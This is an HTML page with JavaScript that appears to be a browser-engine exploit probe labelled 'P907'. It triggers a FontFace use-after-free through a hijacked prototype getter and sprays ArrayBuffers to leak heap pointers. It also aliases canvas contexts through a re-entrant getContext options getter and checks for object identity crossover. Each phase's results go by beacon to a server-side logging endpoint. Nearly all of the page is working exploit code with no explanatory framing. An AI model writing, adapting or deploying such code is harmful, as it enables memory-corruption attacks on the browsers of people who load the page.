<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P907: DOM Identity Crossover, Transform Matrix & Gradient Bridge</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P907...</div>
<h2>P907: DOM Identity Crossover, Transform Matrix & Gradient Bridge</h2>
<pre id="log">Initializing diagnostic probe P907...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P907-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

log('[*] Probe P907 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: FontFace UAF (Single-Pass with 800ms window)
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;

    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

/* ============================================================
 * PHASE 2: Dual Canvas Aliasing (Preserving Elements & Contexts)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCanvases = [];
var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCanvases.push(c);
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 2: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * ASYNCHRONOUS EVALUATION (800ms window)
 * ============================================================ */
setTimeout(function() {
  delete FontFace.prototype.then;

  /* --- Check FontFace UAF Leak --- */
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  var delta = 0;

  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
    if (Hstr !== 'unknown' && q13str !== 'unknown' && H_hi === q13hi) {
      delta = H_lo - q13lo;
    }
  }

  log('[+] Font UAF: H=' + Hstr + ' | q13=' + q13str + ' (Slot #' + bestI + ', nz=' + bestNz + ')', bestI >= 0 ? 'ok' : 'fail');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI + '|nz=' + bestNz);

  /* ============================================================
   * PHASE 3: Canvas Element Identity Crossover
   * ============================================================ */
  var canvasSame = false;
  var canvasCtor = 'none';
  var widthSyncOk = false;

  if (idx1 >= 0 && sprayCanvases[idx1]) {
    try {
      var innerCanvas = innerCtx1.canvas;
      canvasSame = (innerCanvas === sprayCanvases[idx1]);
      canvasCtor = innerCanvas ? innerCanvas.constructor.name : 'null';

      // Test width mutation propagation
      sprayCanvases[idx1].width = 64;
      var wInner = innerCanvas ? innerCanvas.width : -1;
      widthSyncOk = (wInner === 64);
    } catch(e) {
      canvasCtor = 'err:' + (e.message || '').slice(0, 30);
    }
  }

  log('[+] Phase 3: Canvas Identity: same=' + canvasSame + ', ctor=' + canvasCtor + ', widthSync=' + widthSyncOk, canvasSame ? 'hot' : 'info');
  syncBn('CANVAS-ID', 'same=' + canvasSame + '|ctor=' + canvasCtor + '|wSync=' + widthSyncOk);

  /* ============================================================
   * PHASE 4: AffineTransform Matrix Synchronization
   * ============================================================ */
  var xformOk = false;
  var xformVals = 'none';

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // Inscribe affine transform via dangling innerCtx1
      innerCtx1.setTransform(1.5, 2.25, 3.125, 4.0625, 500.5, 600.75);

      // Read back via sprayCtxs[idx1].getTransform()
      var m = sprayCtxs[idx1].getTransform();
      if (m && Math.abs(m.a - 1.5) < 0.001 && Math.abs(m.b - 2.25) < 0.001 &&
          Math.abs(m.c - 3.125) < 0.001 && Math.abs(m.d - 4.0625) < 0.001 &&
          Math.abs(m.e - 500.5) < 0.001 && Math.abs(m.f - 600.75) < 0.001) {
        xformOk = true;
      }
      xformVals = 'a=' + (m ? m.a : 0) + ',e=' + (m ? m.e : 0) + ',f=' + (m ? m.f : 0);
    } catch(e) {
      xformVals = 'err:' + (e.message || '').slice(0, 30);
    }
  }

  log('[+] Phase 4: Transform Matrix: ok=' + xformOk + ' (' + xformVals + ')', xformOk ? 'hot' : 'info');
  syncBn('XFORM-SYNC', 'ok=' + xformOk + '|vals=' + xformVals);

  /* ============================================================
   * PHASE 5: CanvasGradient C++ Object Identity Inspection
   * ============================================================ */
  var gradSame = false;
  var gradType = 'none';

  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      var g = innerCtx1.createLinearGradient(0, 0, 100, 100);
      g.addColorStop(0, '#ff0000');
      g.addColorStop(1, '#0000ff');
      innerCtx1.fillStyle = g;

      var readG = sprayCtxs[idx1].fillStyle;
      gradSame = (readG === g);
      gradType = readG ? (readG.constructor ? readG.constructor.name : typeof readG) : 'null';

      // Reset fillStyle to prevent memory pinning
      sprayCtxs[idx1].fillStyle = '#000000';
    } catch(e) {
      gradType = 'err:' + (e.message || '').slice(0, 30);
    }
  }

  log('[+] Phase 5: Gradient Object: same=' + gradSame + ' (' + gradType + ')', 'hot');
  syncBn('GRAD-SYNC', 'same=' + gradSame + '|type=' + gradType);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P907 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P907 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str, 'ok');
  log('    - Canvas Same: ' + canvasSame + ' | Xform Sync: ' + xformOk, 'hot');
  log('    - Gradient Same: ' + gradSame + ' (' + gradType + ')', 'hot');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|cSame=' + canvasSame + '|xform=' + xformOk + '|gradSame=' + gradSame + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 800);
</script>
</body>
</html>
